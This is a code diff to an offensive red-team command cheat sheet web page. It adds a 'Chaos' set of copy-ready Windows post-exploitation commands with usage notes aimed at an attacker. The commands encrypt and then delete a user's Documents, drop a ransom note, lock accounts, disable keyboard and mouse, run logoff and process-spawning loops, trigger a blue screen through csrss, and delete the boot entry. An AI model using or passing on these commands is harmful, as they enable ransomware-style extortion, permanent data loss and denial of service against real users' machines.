@@ -111,6 +111,8 @@
   .tag.recon.active { background: #4caf50; color: #000; }
   .tag.cloud { color: #03a9f4; border-color: #03a9f4; }
   .tag.cloud.active { background: #03a9f4; color: #000; }
+  .tag.chaos { color: #ff2a6d; border-color: #ff2a6d; }
+  .tag.chaos.active { background: #ff2a6d; color: #fff; }
   .cmd-tag.c2 { color: #ff6b35; border-color: #ff6b35; }
   .cmd-tag.privesc { color: #9b59b6; border-color: #9b59b6; }
   .cmd-tag.persist { color: #e74c3c; border-color: #e74c3c; }
@@ -121,6 +123,7 @@
   .cmd-tag.playbook { color: #ffeb3b; border-color: #ffeb3b; }
   .cmd-tag.recon { color: #4caf50; border-color: #4caf50; }
   .cmd-tag.cloud { color: #03a9f4; border-color: #03a9f4; }
+  .cmd-tag.chaos { color: #ff2a6d; border-color: #ff2a6d; }
   .cmd-count {
     text-align: center;
     font-size: 0.6rem;
@@ -165,6 +168,13 @@
   .cmd-tag.defender { color: var(--red); border-color: var(--red); }
   .cmd-tag.linux { color: var(--green); border-color: var(--green); }
   .cmd-tag.git { color: var(--text); border-color: var(--text); }
+  .cmd-desc {
+    font-size: 0.6rem;
+    color: #888;
+    margin-bottom: 8px;
+    padding-left: 4px;
+    font-style: italic;
+  }
   .cmd-code {
     font-size: 0.7rem;
     color: var(--text);
@@ -229,6 +239,7 @@
   <div class="tag lateral" data-filter="lateral">Lateral</div>
   <div class="tag c2" data-filter="c2">C2</div>
   <div class="tag cloud" data-filter="cloud">Cloud</div>
+  <div class="tag chaos" data-filter="chaos">Chaos</div>
   <div class="tag ps" data-filter="ps">PowerShell</div>
   <div class="tag linux" data-filter="linux">Linux</div>
   <div class="tag vps" data-filter="vps">VPS</div>
@@ -2965,168 +2976,196 @@ const COMMANDS = [
   // ═══════════════════════════════════════════════════════════════
   {
     title: "[CHAOS] Undeletable File on Desktop",
+    desc: "Run as SYSTEM. Creates file owned by SYSTEM with explicit DENY on user delete. They see it but can't remove it. Change 'adminvm1' to target username.",
     code: "echo 'YOU HAVE BEEN PWNED' > C:\\Users\\adminvm1\\Desktop\\PWNED.txt; takeown /f C:\\Users\\adminvm1\\Desktop\\PWNED.txt /a; icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /setowner 'NT AUTHORITY\\SYSTEM'; icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /inheritance:r; icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /grant:r 'NT AUTHORITY\\SYSTEM':F; icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /deny adminvm1:(DE,DC)",
     tags: ["cmd", "chaos", "postexploit"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Send Popup Message to User",
+    desc: "Sends popup message to ALL logged-in sessions. Use 'msg SESSION_ID' to target specific user. Get session IDs with 'qwinsta'.",
     code: "msg * 'Your system has been compromised. - PSYCHO'",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Send Message to Specific Session",
+    desc: "Replace SESSION_ID with the number from 'qwinsta' output. Only that user sees the message.",
     code: "msg SESSION_ID 'You have been hacked.'",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Change Wallpaper",
+    desc: "Changes current user's wallpaper. First upload your image to C:\\Windows\\Temp\\pwned.jpg. UpdatePerUserSystemParameters refreshes without logout.",
     code: "reg add 'HKCU\\Control Panel\\Desktop' /v Wallpaper /t REG_SZ /d C:\\Windows\\Temp\\pwned.jpg /f; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Set Wallpaper for All Users",
+    desc: "Uses Group Policy CSP to force wallpaper for ALL users. Requires SYSTEM or Admin. Persists across reboots. Upload image first.",
     code: "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP' /v DesktopImagePath /t REG_SZ /d C:\\Windows\\Temp\\pwned.jpg /f; reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP' /v DesktopImageStatus /t REG_DWORD /d 1 /f",
     tags: ["cmd", "chaos", "persist"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Encrypt User's Files (7zip)",
+    desc: "Downloads 7zip, installs silently, encrypts Documents folder with password. Replace YOURPASSWORD. -mhe=on hides filenames inside archive.",
     code: "IWR -Uri 'https://www.7-zip.org/a/7z2301-x64.exe' -OutFile C:\\Windows\\Temp\\7z.exe; C:\\Windows\\Temp\\7z.exe /S; & 'C:\\Program Files\\7-Zip\\7z.exe' a -p'YOURPASSWORD' -mhe=on C:\\Windows\\Temp\\encrypted.7z C:\\Users\\adminvm1\\Documents\\*",
     tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Delete Original After Encrypt",
+    desc: "Run AFTER encrypting. Deletes original files and drops ransom note. Make sure encrypted.7z exists first or data is gone forever.",
     code: "Remove-Item C:\\Users\\adminvm1\\Documents\\* -Recurse -Force; Copy-Item C:\\Windows\\Temp\\README.txt C:\\Users\\adminvm1\\Documents\\",
     tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Create Ransom Note",
+    desc: "Creates text file on desktop. Edit message and email. Run before 'Delete Original' so note gets copied to Documents too.",
     code: "echo 'Your files have been encrypted. Contact psycho@proton.me for recovery.' > C:\\Users\\adminvm1\\Desktop\\README.txt",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Lock User Out (Change Password)",
+    desc: "Changes user password immediately. They get locked out of their session. Requires Admin/SYSTEM. Use 'net user USERNAME /active:no' to also disable account.",
     code: "net user adminvm1 H4CK3D123!",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Disable User Account",
+    desc: "Disables account completely. User can't login at all. To re-enable: 'net user USERNAME /active:yes'. Works with SYSTEM or Admin.",
     code: "net user adminvm1 /active:no",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Force Logoff User",
+    desc: "Immediately logs off session. Get SESSION_ID from 'qwinsta'. User loses unsaved work. Use 'tsdiscon' to disconnect without logging off.",
     code: "logoff SESSION_ID",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Continuous Logoff (Annoying)",
+    desc: "Infinite loop that logs off target user every 5 seconds. They login, get kicked, repeat. Change 'adminvm1' to target. Ctrl+C in beacon to stop.",
     code: "while ($true) { quser | Select-String 'adminvm1' | ForEach-Object { $id = ($_ -split '\\s+')[3]; logoff $id }; Start-Sleep 5 }",
     tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Open Websites in Loop",
+    desc: "Opens URL in default browser every 10 seconds forever. Classic rickroll. Change URL and interval as needed. Ctrl+C to stop.",
     code: "while ($true) { Start-Process 'https://youtu.be/dQw4w9WgXcQ'; Start-Sleep 10 }",
     tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Speak Through Speakers",
+    desc: "Uses Windows text-to-speech to speak through user's speakers. Change the message. Works immediately - no downloads needed.",
     code: "Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('You have been hacked')",
     tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Flip Screen Upside Down",
+    desc: "Rotates display 180 degrees. Complex P/Invoke code. May not work on all displays. User can fix via display settings.",
     code: "Add-Type -TypeDefinition @'\\nusing System;using System.Runtime.InteropServices;\\npublic class Display{[DllImport(\"user32.dll\")]public static extern int EnumDisplaySettings(string a,int b,ref DEVMODE c);[DllImport(\"user32.dll\")]public static extern int ChangeDisplaySettings(ref DEVMODE a,int b);[StructLayout(LayoutKind.Sequential)]public struct DEVMODE{[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmDeviceName;public short dmSpecVersion;public short dmDriverVersion;public short dmSize;public short dmDriverExtra;public int dmFields;public int dmPositionX;public int dmPositionY;public int dmDisplayOrientation;public int dmDisplayFixedOutput;public short dmColor;public short dmDuplex;public short dmYResolution;public short dmTTOption;public short dmCollate;[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmFormName;public short dmLogPixels;public int dmBitsPerPel;public int dmPelsWidth;public int dmPelsHeight;public int dmDisplayFlags;public int dmDisplayFrequency;}}\\n'@",
     tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Disable Keyboard",
+    desc: "Disables keyboard input. User can't type. May require reboot to fix. Use with caution - you need keyboard to undo.",
     code: "rundll32 keyboard,disable",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Disable Mouse",
+    desc: "Disables mouse input. User can't click. May require reboot to fix. Combine with keyboard disable for full lockout.",
     code: "rundll32 mouse,disable",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Hide All Desktop Icons",
+    desc: "Hides all desktop icons via registry. Explorer restart applies change immediately. Set to 0 to show icons again.",
     code: "reg add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced' /v HideIcons /t REG_DWORD /d 1 /f; Stop-Process -Name explorer -Force; Start-Process explorer",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Hide Taskbar",
+    desc: "Hides taskbar via binary registry value. Incomplete - need full binary data. Easier method: right-click taskbar > settings > auto-hide.",
     code: "reg add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3' /v Settings /t REG_BINARY /d 30000000feffffff... /f",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Delete Recycle Bin Contents",
+    desc: "Permanently deletes all files in recycle bin. -Force skips confirmation. Silent fail if empty. Unrecoverable.",
     code: "Clear-RecycleBin -Force -ErrorAction SilentlyContinue",
     tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Fill Disk with Garbage",
+    desc: "Creates 10GB empty file instantly. Change size (bytes) as needed. fsutil is faster than writing actual data. Delete to free space.",
     code: "fsutil file createnew C:\\Windows\\Temp\\garbage.bin 10737418240",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Spawn Infinite Notepad",
+    desc: "Opens new notepad every second forever. Exhausts memory/handles eventually. Ctrl+C in beacon to stop. Task Manager to mass-kill.",
     code: "while ($true) { Start-Process notepad; Start-Sleep 1 }",
     tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Kill Explorer Loop",
+    desc: "Kills explorer.exe every 3 seconds. Taskbar/desktop disappear repeatedly. User can't use GUI normally. Ctrl+C to stop.",
     code: "while ($true) { Stop-Process -Name explorer -Force; Start-Sleep 3 }",
     tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Shutdown in 60 Seconds",
+    desc: "Starts 60-second shutdown countdown with custom message. User sees warning popup. Can be cancelled with 'shutdown /a'.",
     code: "shutdown /s /t 60 /c 'Your system will shutdown in 60 seconds. - PSYCHO'",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Cancel Shutdown",
+    desc: "Cancels pending shutdown/restart. Must run before timer expires. Use if you accidentally triggered shutdown.",
     code: "shutdown /a",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] BSOD (Blue Screen)",
+    desc: "CRITICAL: Kills csrss.exe (Windows session manager). Instant blue screen. System crashes immediately. Data loss likely. DANGEROUS.",
     code: "wmic process where name='csrss.exe' delete",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Fork Bomb (Careful!)",
+    desc: "CRITICAL: Batch file that spawns infinite copies of itself. Exhausts CPU/memory in seconds. System freezes. Save as .bat and run.",
     code: "%0|%0",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Corrupt Boot (DANGEROUS)",
+    desc: "CRITICAL: Deletes default boot entry. System won't boot after restart. Requires recovery media to fix. PERMANENT DAMAGE.",
     code: "bcdedit /delete {default}",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
@@ -3145,7 +3184,7 @@ function render() {
   let visible = 0;
 
   list.innerHTML = COMMANDS.map((cmd, idx) => {
-    const matchesTerm = !term || cmd.title.toLowerCase().includes(term) || cmd.code.toLowerCase().includes(term);
+    const matchesTerm = !term || cmd.title.toLowerCase().includes(term) || cmd.code.toLowerCase().includes(term) || (cmd.desc && cmd.desc.toLowerCase().includes(term));
     const matchesTag = activeFilters.size === 0 || cmd.tags.some(t => activeFilters.has(t));
     const show = matchesTerm && matchesTag;
     if (show) visible++;
@@ -3156,6 +3195,7 @@ function render() {
           <div class="cmd-title">${cmd.title}</div>
           ${cmd.tags.map(t => `<div class="cmd-tag ${t}">${t.toUpperCase()}</div>`).join('')}
         </div>
+        ${cmd.desc ? `<div class="cmd-desc">${cmd.desc}</div>` : ''}
         <div class="cmd-code" style="border-left-color:${cmd.accent}">${escapeHtml(cmd.code)}</div>
         <div class="cmd-actions">
           <button class="btn" onclick="copyCmd(${idx}, this)">COPY</button>
